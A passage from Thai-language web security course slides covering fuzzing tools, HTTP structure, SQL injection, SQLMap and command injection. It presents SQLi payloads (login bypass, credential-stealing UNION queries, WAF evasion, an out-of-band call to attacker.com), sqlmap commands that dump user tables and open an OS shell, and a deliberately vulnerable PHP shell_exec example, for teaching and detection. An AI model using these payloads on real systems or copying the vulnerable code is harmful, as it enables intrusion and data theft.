- **คุณลักษณะ**: เวอร์ชัน Graphic User Interface (มีหน้าต่างให้กดปรับแต่ง) เหมาะสำหรับการรันหาพาเนลแอดมินหรือทรัพยากรเว็บแบบเห็นภาพ

#### 📁 FFUF (Fast Web Fuzzer)
- **คุณลักษณะ**: fuzzer ความเร็วสูงในสายงานเจาะระบบ มีลูกเล่น recursive ค้นหาเส้นทางเชิงลึกแบบซับซ้อน
- **ตัวอย่างการสแกน**:
  ```bash
  ffuf -u https://target.com/admin/FUZZ -w /usr/share/wordlists/rockyou.txt
  ```

#### 📁 Gobuster (Go-written scanner)
- **คุณลักษณะ**: พัฒนาขึ้นมาด้วยภาษา Go ทำให้ข้ามขีดจำกัดความเร็วของเครื่องมืออื่นๆ มาก
- **ตัวอย่างการค้นหาไฟล์ .php**:
  ```bash
  gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php
  ```

---

### 📄 SLIDE 59-75: HTTP Message Anatomy (โครงสร้างทราฟฟิกเว็บ)
- **HTTP Request**: ทราฟฟิกข้อมูลที่ฝั่ง Client ส่งหาเซิร์ฟเวอร์ ประกอบด้วย:
  - **Method**: คำสั่งการทำงาน เช่น GET (ดึงข้อมูล), POST (ส่งประมวลผล), PUT (ปรับปรุงไฟล์), DELETE (ลบไฟล์)
  - **Path**: พิกัดเป้าหมาย เช่น `/api/user?id=123`
  - **Protocol**: ระบุรุ่นการส่ง เช่น `HTTP/1.1` หรือ `HTTP/2`
  - **Headers**: เมทาดาตาเสริม เช่น User-Agent (ระบุประเภทบราวเซอร์), Cookie (ระบุสิทธิ์)
  - **Body**: ข้อมูลชุดใหญ่ที่ฝั่งเซิร์ฟเวอร์นำไปประมวลผล (มีผลเฉพาะ POST/PUT)
- **HTTP Response**: ทราฟฟิกตอบกลับจากเซิร์ฟเวอร์ ประกอบด้วย:
  - **Status Line**: แจ้งรหัสผลลัพธ์ เช่น `200 OK` (สำเร็จ), `301 Moved` (ย้ายหน้า), `401 Unauthorized` (ไม่ผ่านสิทธิ์), `403 Forbidden` (ห้ามเข้า), `404 Not Found` (ไม่พบไฟล์), `500 Server Error` (เซิร์ฟเวอร์พัง)
  - **Server**: แจ้งโปรแกรมที่รันบนเครื่อง เช่น Apache, Nginx
  - **Headers**: เช่น Content-Type (ประเภทผลลัพธ์)
  - **Body**: ซอร์สโค้ด HTML หรือข้อมูล JSON ที่บราวเซอร์นำมาวาดแสดงผล
- **cURL Command**: โปรแกรมรัน Command Line ยอดนิยมในการยิงขอเรียกข้อมูลดิบจากเซิร์ฟเวอร์
  - **ตัวอย่าง**: สั่งดึงเฉพาะ Header ของเป้าหมายเพื่อตรวจความปลอดภัย:
    ```bash
    curl -I https://www.example.com
    ```

---

### 📄 SLIDE 76-90: Malicious HTTP Message Detections (การตรวจสอบภัยคุกคาม)
- **Unusual HTTP Methods**: นักโจมตีใช้ประโยชน์จากเมธอดพิเศษ เช่น OPTIONS, TRACE หรือ WebDAV (MKCOL, COPY) เพื่อตรวจและควบคุมไฟล์เซิร์ฟเวอร์
- **Unusual User-Agents**: แฮกเกอร์ใช้โปรแกรมโจมตี ซึ่งตัวโปรแกรมจะแนบ User-Agent แปลกปลอมมา (เช่น `sqlmap/1.5.2`, `HackerTool/1.0`, `python-requests`, `Nmap compatible`) แอดมินจึงควรเฝ้าระวังหรือปิดกั้นทราฟฟิกเหล่านี้
- **Large/Encoded POST**: การลอบส่ง Web Shell หรือคำสั่งยิงเจาะโดยเข้ารหัส Base64 หรือ Hex เพื่อให้ผ่านพ้นระบบ WAF (Web Application Firewall)

---

### 📄 SLIDE 91-100: SQL Injection (SQLi) Introduction & Concepts
- **คำจำกัดความ**: SQL Injection (SQLi) คือหนึ่งในภัยคุกคามทางเว็บที่ร้ายแรงที่สุด เกิดขึ้นเมื่อแอปพลิเคชันนำข้อมูลอินพุตที่ป้อนจากฝั่งผู้ใช้ไปเชื่อมต่อหรือต่อสตริงเข้ากับประโยคคิวรีของฐานข้อมูลโดยตรงโดยไม่มีการกรองตรวจสอบความรัดกุม (Sanitize) ส่งผลให้แฮกเกอร์สามารถสอดแทรกประโยคคำสั่ง SQL เพื่อควบคุม ค้นหา ดึง หรือล้างฐานข้อมูลหลังบ้านได้
- **ลิงก์ศึกษาเพิ่มเติมการป้องกัน SQLi**: [How to Stop SQL Injection](https://www.indusface.com/blog/how-to-stop-sql-injection/)

#### 💻 ตัวอย่างโครงสร้างคิวรีเมื่อเกิดภัยคุกคาม (Normal vs Malicious Query)

<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 1.5rem 0;">
<div style="background: rgba(16, 185, 129, 0.05); border: 1px solid rgba(16, 185, 129, 0.2); border-radius: 8px; padding: 16px;">
<div style="font-weight: bold; color: #10b981; font-size: 0.85rem; margin-bottom: 8px;">🟢 1. การตรวจสอบคิวรีปกติ (Normal SQL Query)</div>
<p style="font-size: 0.76rem; color: #cbd5e1; line-height: 1.5; margin: 0 0 10px;">
ผู้ใช้งานทั่วไปกรอกข้อมูลปกติเข้าสู่ระบบ:
<br>• Username: <code>admin</code>
<br>• Password: <code>p@ssW0rd</code>
</p>
<pre style="background: #02040a; color: #a7f3d0; border: 1px solid rgba(255,255,255,0.05); border-radius: 6px; padding: 10px; font-size: 0.7rem; font-family: monospace; margin: 0;">SELECT * FROM users 
WHERE username = 'admin' 
AND password = 'p@ssW0rd';</pre>
</div>
<div style="background: rgba(239, 68, 68, 0.05); border: 1px solid rgba(239, 68, 68, 0.2); border-radius: 8px; padding: 16px;">
<div style="font-weight: bold; color: #ef4444; font-size: 0.85rem; margin-bottom: 8px;">🔴 2. การบายพาสยืนยันตัวตน (Authentication Bypass)</div>
<p style="font-size: 0.76rem; color: #cbd5e1; line-height: 1.5; margin: 0 0 10px;">
แฮกเกอร์ส่งคอมเมนต์ไปปิดการเช็ครหัสผ่านด้านหลัง:
<br>• Username: <code>admin' --</code>
<br>• Password: <code>xxx</code> (อะไรก็ได้)
</p>
<pre style="background: #02040a; color: #fca5a5; border: 1px solid rgba(239, 68, 68, 0.15); border-radius: 6px; padding: 10px; font-size: 0.7rem; font-family: monospace; margin: 0;">SELECT * FROM users 
WHERE username = 'admin' --' 
AND password = 'xxx';</pre>
</div>
</div>

---

### 📄 SLIDE 101-110: Advanced SQL Injection Techniques (เทคนิคการยิงเจาะระบบฐานข้อมูล)

#### 📂 Error-Based SQL Injections: Stealing Data (ดึงข้อมูลผ่านผลลัพธ์ที่เป็นจริง)
เมื่อเว็บยอมรับค่า User ID เพื่อนำไปแสดงผล แฮกเกอร์ป้อนเงื่อนไขที่เป็นจริงเสมอลงไป:
- **ข้อมูลที่ป้อน (Payload)**: `id = ' OR '1'='1`
- **ประโยค Query หลังบ้าน**:
  ```sql
  SELECT id, name FROM users WHERE id = '' OR '1'='1';
  ```
- **คำอธิบาย**: ตรรกะเงื่อนไขเปรียบเทียบ `id = ''` เป็นเท็จ (False) แต่ `'1'='1'` เป็นจริง (True) ทำให้ผลลัพธ์ประโยคคือ `F ∨ T` ได้ผลรวมเป็น **จริง (True)** เสมอ ส่งผลให้ระบบดึงรายชื่อและข้อมูลผู้ใช้ทุกคนในตารางออกมาแสดงผล (เช่น สมชาย ดีใจ, วงศยศ เกียรติศรี)

#### 📂 UNION-Based SQL Injections (ดึงข้อมูลตารางอื่นมารวมแสดงผล)
เมื่อต้องการควบรวมผลลัพธ์ของคิวรีหลัก เข้ากับตารางอื่นที่ต้องการแอบสืบค้นข้อมูล:
- **ข้อมูลที่ป้อน (Payload)**: `' UNION SELECT username, password FROM users --`
- **ประโยค Query หลังบ้าน**:
  ```sql
  SELECT id, name FROM users WHERE id = '' UNION SELECT username, password FROM users --';
  ```
- **คำอธิบาย**: ระบบจะนำผลลัพธ์ของตารางแฮกเกอร์มาปนแสดงผล ทำให้รหัสผ่านและชื่อผู้ใช้งานในตาราง `users` ถูกขโมยออกไปทันที

#### 📂 Blind SQL Injections (Boolean-Based) (การสืบข้อมูลด้วยคำถามจริง/เท็จ)
ในกรณีที่หน้าเว็บไม่มีการแจ้งข้อผิดพลาดและไม่แสดงผลลัพธ์ตารางโดยตรง แฮกเกอร์จะส่งเงื่อนไขไปถามเว็บว่าถ้าเป็นจริงให้โหลดหน้าปกติ ถ้าเป็นเท็จให้แสดงอีกแบบ:
- **ข้อมูลที่ป้อน (Payload)**: `' OR (SELECT SUBSTRING(database(),1,1)) = 'm' --`
- **ประโยค Query หลังบ้าน**:
  ```sql
  SELECT id, name FROM users WHERE id = '' OR (SELECT SUBSTRING(database(),1,1)) = 'm' --';
  ```
- **คำอธิบาย**: หากตัวอักษรตัวแรกของชื่อฐานข้อมูลขึ้นต้นด้วยตัวอักษร `'m'` หน้าเว็บจะโหลดเรียบร้อยตามเงื่อนไขที่เป็นจริง หากไม่ใช่ ระบบจะไม่แสดงข้อมูลใดๆ ทำให้แฮกเกอร์สามารถแกะตัวอักษรของข้อมูลออกมาได้ทีละตัวจากการทดสอบซ้ำๆ

---

### 📄 SLIDE 111-125: SQL Injection Payload Cheatsheet (ตารางสรุปคีย์เจาะระบบ)
รายการ Payload ยอดนิยมอ้างอิงจากคลังซอร์สระดับสากล เพื่อการวิเคราะห์ทราฟฟิกล็อกและตรวจสอบความปลอดภัย:

<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 12px; font-weight: bold; width: 220px;">ประเภทช่องโหว่ (Category)</th>
<th style="padding: 12px; font-weight: bold; font-family: monospace;">คีย์เจาะระบบ (Payload)</th>
<th style="padding: 12px; font-weight: bold;">ผลลัพธ์และคำอธิบาย (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">Authentication Bypass</td>
<td style="padding: 12px; font-family: monospace; color: #f43f5e;">' OR '1'='1' --</td>
<td style="padding: 12px;">ทำให้เงื่อนไขตรวจสอบเป็นจริงเสมอเพื่อข้ามผ่านระบบตรวจสอบสิทธิ์ล็อกอิน</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">Authentication Bypass (Cont)</td>
<td style="padding: 12px; font-family: monospace; color: #f43f5e;">admin' --</td>
<td style="padding: 12px;">ล็อกอินเป็นผู้ใช้งานชื่อ "admin" โดยตัดบรรทัดตรวจเช็ค Password ออกไปด้านหลัง</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">UNION-Based SQLi</td>
<td style="padding: 12px; font-family: monospace; color: #3b82f6;">' UNION SELECT null, username, password FROM users --</td>
<td style="padding: 12px;">ดึงรายชื่อและรหัสผ่านจากตาราง users มารวมในผลลัพธ์การแสดงผลหลัก</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">UNION-Based SQLi (Cont)</td>
<td style="padding: 12px; font-family: monospace; color: #3b82f6;">' UNION SELECT database(), user(), version() --</td>
<td style="padding: 12px;">เรียกดูข้อมูลรายละเอียดของฐานข้อมูล สิทธิ์ผู้รัน และรุ่นซอฟต์แวร์ระบบ</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">UNION-Based Schema Enum</td>
<td style="padding: 12px; font-family: monospace; color: #3b82f6;">' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --</td>
<td style="padding: 12px;">ดึงรายชื่อตาราง (Table Names) ทั้งหมดที่มีอยู่ในฐานข้อมูลปัจจุบัน</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">Error-Based SQLi</td>
<td style="padding: 12px; font-family: monospace; color: #fbbf24;">' AND (SELECT @@version) --</td>
<td style="padding: 12px;">สั่งรันคำสั่งตรวจสอบเวอร์ชันของเซิร์ฟเวอร์ฐานข้อมูลโดยตรง</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">Error-Based (Forced Error)</td>
<td style="padding: 12px; font-family: monospace; color: #fbbf24;">' AND 1=convert(int, (SELECT @@version)) --</td>
<td style="padding: 12px;">บังคับให้เกิดข้อผิดพลาดในการแปลงประเภทข้อมูล เพื่อส่งข้อมูลเวอร์ชันออกมาพร้อมคำอธิบายความผิดพลาด</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">Boolean-Based Blind SQLi</td>
<td style="padding: 12px; font-family: monospace; color: #10b981;">' AND (SELECT SUBSTRING(database(),1,1)) = 'm' --</td>
<td style="padding: 12px;">ทดสอบว่าตัวอักษรตัวแรกของชื่อระบบฐานข้อมูลเป็นอักษร 'm' หรือไม่</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">Time-Based Blind SQLi</td>
<td style="padding: 12px; font-family: monospace; color: #a855f7;">' OR IF(1=1, SLEEP(5), 0) --</td>
<td style="padding: 12px;">สั่งหน่วงเวลาการตอบสนอง 5 วินาทีหากประโยคทดสอบตรรกะเป็นจริง เพื่อแกะข้อมูลแบบไม่เห็นผลหน้าจอ</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">Out-of-Band (OOB) SQLi</td>
<td style="padding: 12px; font-family: monospace; color: #6366f1;">' UNION SELECT LOAD_FILE('//attacker.com/data') --</td>
<td style="padding: 12px;">สั่งให้เครื่องแม่ข่ายฐานข้อมูลดึงไฟล์หรือเชื่อมต่อไปยังเครือข่ายภายนอกของแฮกเกอร์</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">WAF Bypass Techniques</td>
<td style="padding: 12px; font-family: monospace; color: #ec4899;">admin'/**/OR/**/1=1/**/--</td>
<td style="padding: 12px;">ใช้ตัวอักษรคอมเมนต์แบบหลายบรรทัด <code>/**/</code> เพื่อเลี่ยงการตรวจจำเศษช่องว่างของตัวกรองเว็บ (WAF Bypass)</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 126-140: SQL Injections: SQLMap (เครื่องมือเจาะระบบฐานข้อมูลอัตโนมัติ)
**SQLMap** คือโปรแกรมภาษา Python แบบ Command Line ยอดนิยมระดับโลกที่ออกแบบมาเพื่อสืบค้นหาช่องโหว่ วิเคราะห์ และดำเนินการโจมตีช่องโหว่ประเภท SQL Injection บนเว็บบอร์ดหรือแอปพลิเคชันเป้าหมายได้โดยอัตโนมัติ:
- สามารถสแกนและดึงสคีมาฐานข้อมูล, รายชื่อผู้ใช้ รหัสผ่านแฮช และเข้าครอบครองสิทธิ์การรันคำสั่งเครื่องแม่ข่ายเซิร์ฟเวอร์ย่อยได้
- **ลิงก์ศึกษาการใช้งาน**: [TryHackMe SQLMap Room](https://tryhackme.com/room/sqlmap)

#### 🛠️ ตารางสรุปออปชันคำสั่งยอดนิยมของ SQLMap (Cheatsheet)

<h5 style="margin: 1.5rem 0 0.5rem; font-size: 0.82rem; color: #00f0ff;">1. ข้อมูลการป้อนเรียกใช้งานพื้นฐาน (Basic Options)</h5>
<div style="overflow-x: auto; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 1.5rem;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 10px; font-weight: bold; width: 200px;">คำสั่ง (Option)</th>
<th style="padding: 10px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">-u &lt;URL&gt;</td>
<td style="padding: 10px;">ระบุ URL เป้าหมาย (เช่น <code>-u "http://target.com/index.php?id=1"</code>)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--data "&lt;POST_DATA&gt;"</td>
<td style="padding: 10px;">กำหนดตัวแปรเมื่อต้องการทดสอบแบบยิงขอผ่าน POST request (เช่น <code>--data="user=admin&amp;pass=1"</code>)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--cookie "&lt;COOKIE&gt;"</td>
<td style="padding: 10px;">แนบค่า Session Cookie เพื่อสวมสิทธิ์การทดสอบสำหรับโซนจำกัดสิทธิ์</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--random-agent</td>
<td style="padding: 10px;">สุ่มเปลี่ยนค่า User-Agent เสมือนเว็บบราวเซอร์ต่างๆ เพื่อผ่านตัวบล็อกจำพวก Scanner</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--proxy "&lt;PROXY&gt;"</td>
<td style="padding: 10px;">ส่งทราฟฟิกทดสอบผ่าน Proxy เช่น Burp Suite เพื่อวิเคราะห์การทำงาน (เช่น <code>--proxy="http://127.0.0.1:8080"</code>)</td>
</tr>
</tbody>
</table>
</div>

<h5 style="margin: 1.5rem 0 0.5rem; font-size: 0.82rem; color: #a855f7;">2. การสืบข้อมูลโครงสร้างฐานข้อมูล (Database Enumeration)</h5>
<div style="overflow-x: auto; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 1.5rem;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #a855f7;">
<th style="padding: 10px; font-weight: bold; width: 200px;">คำสั่ง (Option)</th>
<th style="padding: 10px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #f3e8ff;">--dbs</td>
<td style="padding: 10px;">ดึงรายชื่อฐานข้อมูล (Databases) ทั้งหมดที่อยู่ในเครื่องเป้าหมาย</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #f3e8ff;">-D &lt;database&gt;</td>
<td style="padding: 10px;">กำหนดเพื่อเจาะจงฐานข้อมูลเป้าหมายตัวใดตัวหนึ่ง</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #f3e8ff;">--tables</td>
<td style="padding: 10px;">ดึงรายชื่อตาราง (Tables) ทั้งหมดที่มีอยู่ในฐานข้อมูลที่ระบุไว้</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #f3e8ff;">-T &lt;table&gt;</td>
<td style="padding: 10px;">กำหนดเลือกตารางข้อมูลเพื่อระบุย่อยเป้าหมายในการดึงฟิลด์</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #f3e8ff;">--columns</td>
<td style="padding: 10px;">ดึงฟิลด์หรือรายชื่อคอลัมน์ (Columns) ทั้งหมดในตารางที่เลือกไว้</td>
</tr>
</tbody>
</table>
</div>

<h5 style="margin: 1.5rem 0 0.5rem; font-size: 0.82rem; color: #fbbf24;">3. การดึงชุดข้อมูลภายในตาราง (Data Extraction)</h5>
<div style="overflow-x: auto; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 1.5rem;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #fbbf24;">
<th style="padding: 10px; font-weight: bold; width: 200px;">คำสั่ง (Option)</th>
<th style="padding: 10px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #fef3c7;">--dump</td>
<td style="padding: 10px;">ดาวน์โหลดข้อมูลแถวทั้งหมดในตารางหรือคอลัมน์ที่สืบค้นออกมาแสดง</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #fef3c7;">--dump-all</td>
<td style="padding: 10px;">สั่งดาวน์โหลดตารางข้อมูลทั้งหมดของฐานข้อมูลเครื่องเป้าหมาย (อาจใช้เวลานาน)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #fef3c7;">--where="&lt;cond&gt;"</td>
<td style="padding: 10px;">ดึงข้อมูลเฉพาะแถวที่มีสิทธิ์ตามเงื่อนไข (เช่น <code>--where="role='admin'"</code>)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #fef3c7;">--sql-shell</td>
<td style="padding: 10px;">เปิดหน้าจำลองรันชุดคิวรี SQL แบบโต้ตอบได้เสมือนนั่งอยู่ในเซิร์ฟเวอร์ฐานข้อมูล</td>
</tr>
</tbody>
</table>
</div>

<h5 style="margin: 1.5rem 0 0.5rem; font-size: 0.82rem; color: #ec4899;">4. การควบคุมและยึดระบบชั้นสูง (Advanced Exploits)</h5>
<div style="overflow-x: auto; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 1.5rem;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #ec4899;">
<th style="padding: 10px; font-weight: bold; width: 200px;">คำสั่ง (Option)</th>
<th style="padding: 10px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #fce7f3;">--passwords</td>
<td style="padding: 10px;">ดึงรหัสผ่านผู้ใช้งานในฐานข้อมูลพร้อมทำการวิเคราะห์แฮชรหัสผ่านออกหน้าจอ</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #fce7f3;">--is-dba</td>
<td style="padding: 10px;">ตรวจสอบว่าผู้ใช้เชื่อมต่อฐานข้อมูลปัจจุบันถือสิทธิ์ระดับแอดมินสูงสุด (DBA) หรือไม่</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #fce7f3;">--os-shell</td>
<td style="padding: 10px;">ดำเนินการเจาะลึกเพื่อสร้าง Terminal shell สำหรับพิมพ์รันคำสั่งควบคุมของระบบปฏิบัติการแม่ข่ายเซิร์ฟเวอร์ย่อย</td>
</tr>
</tbody>
</table>
</div>

<h5 style="margin: 1.5rem 0 0.5rem; font-size: 0.82rem; color: #10b981;">5. การก้าวข้ามระบบความปลอดภัย (Security Bypass & Techniques)</h5>
<div style="overflow-x: auto; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 1.5rem;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #10b981;">
<th style="padding: 10px; font-weight: bold; width: 200px;">คำสั่ง (Option)</th>
<th style="padding: 10px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #ecfdf5;">--tamper=&lt;script&gt;</td>
<td style="padding: 10px;">เรียกใช้สคริปต์สลับฟิลเตอร์เพื่อเข้ารหัสเลี่ยงการตรวจจับของ WAF (เช่น <code>--tamper=randomcase</code>)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #ecfdf5;">--level=1-5</td>
<td style="padding: 10px;">ความลึกในการตรวจสอบหาพาธและพารามิเตอร์แปลกปลอม (ค่าปกติคือ 1, สูงสุดคือ 5)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #ecfdf5;">--risk=1-3</td>
<td style="padding: 10px;">ระดับความเสี่ยงของ Payload ที่ใช้ยิง ซึ่งระดับสูงอาจส่งผลเสียต่อความคงสภาพของระบบ (สูงสุดคือ 3)</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 141-150: SQLMap Command Execution Examples (ตัวอย่างคำสั่งการสแกนจริง)

#### 🟢 การวิเคราะห์หาและดูรายชื่อฐานข้อมูล
เริ่มต้นสแกนตรวจสอบว่าพารามิเตอร์เป้าหมายมีจุดอ่อนตัวใดของฐานข้อมูลบ้าง:
```bash
sqlmap -u "http://target.com/index.php?id=1" --dbs
```

#### 🟢 การไล่ดึงโครงสร้างและดาวน์โหลดข้อมูลตาราง
ดึงรายชื่อตารางของฐานข้อมูลชื่อ `target_db` จากนั้นเข้าไปดึงรายชื่อคอลัมน์คัดกรองในตาราง `users` เพื่อดาวน์โหลดข้อมูล:
```bash
# 1. แสดงรายชื่อตารางข้อมูลทั้งหมด
sqlmap -u "http://target.com/index.php?id=1" -D target_db --tables

# 2. แสดงรายชื่อคอลัมน์ในตารางเป้าหมาย
sqlmap -u "http://target.com/index.php?id=1" -D target_db -T users --columns

# 3. ดาวน์โหลด (Dump) ข้อมูลบัญชีทั้งหมดออกมาเก็บลงไฟล์
sqlmap -u "http://target.com/index.php?id=1" -D target_db -T users --dump
```

#### 🟢 การทดสอบเพื่อก้าวข้ามตัวคัดกรอง (WAF & Login Evading)
สั่งเปลี่ยนตัวอักษรใหญ่-เล็ก เพื่อบายพาสไฟร์วอลล์ หรือทดสอบตัวแปรในการล็อกอินหน้าเว็บ:
```bash
# บายพาส WAF โดยการเปลี่ยนเคสพารามิเตอร์แบบสุ่ม
sqlmap -u "http://target.com/index.php?id=1" --tamper=randomcase

# ทดสอบเจาะหน้าล็อกอินของเป้าหมายผ่านการกรอก POST data
sqlmap -u "http://target.com/login.php" --data="username=admin&password=admin" --dump
```

#### 🟢 การเข้าครอบครองและควบคุมเครื่องแม่ข่าย (System Shell Access)
เมื่อผู้ใช้งานฐานข้อมูลเชื่อมต่อมีสิทธิ์ระดับสูง ดำเนินการยิงช่องโหว่เพื่อขอกล่องส่งคำสั่งระบบปฏิบัติการหลัก (OS Command Execution):
```bash
sqlmap -u "http://target.com/index.php?id=1" --os-shell
```

---

### 📄 SLIDE 151-160: Command Injections (ภัยคุกคามการแทรกฝังคำสั่งระบบปฏิบัติการ)
**ช่องโหว่ Command Injection** คือช่องโหว่ทางเว็บแอปพลิเคชันที่ร้ายแรงที่สุดช่องทางหนึ่ง เกิดจากโปรแกรมดึงอินพุตจากผู้ใช้งานไปรันร่วมกับคำสั่งของระบบปฏิบัติการ (System Commands) หลังบ้านโดยตรงโดยไม่คัดกรองความปลอดภัยอย่างเพียงพอ
- ส่งผลให้ผู้ประสงค์ร้ายสามารถป้อนเครื่องหมายคั่นคำสั่ง (เช่น `;`, `&`, `|`, `&&`) เพื่อสอดแทรกรันคำสั่งอื่นของระบบปฏิบัติการบนเซิร์ฟเวอร์ได้แบบไม่มีข้อจำกัด
- **ลิงก์ศึกษาเพิ่มเติมการทำงาน**: [What is Command Injection](https://www.indusface.com/learning/what-is-command-injection/)

#### 💻 ตัวอย่างซอร์สโค้ดที่เป็นอันตราย (Vulnerable Implementation)
ตัวอย่างระบบส่งคำสั่ง Ping ทดสอบเครื่องเครือข่ายหลังบ้านในภาษา PHP:
```php
<?php
  // ดึงค่าอินพุต IP จากพารามิเตอร์โดยตรง
  $ip = $_GET['ip'];
  
  // นำไปต่อสตริงในคำสั่งระบบปฏิบัติการตรงๆ โดยไม่มีการดักจับตัวอักษรพิเศษ
  $output = shell_exec("ping -c 4 " . $ip);
  echo "<pre>" . $output . "</pre>";
?>
```
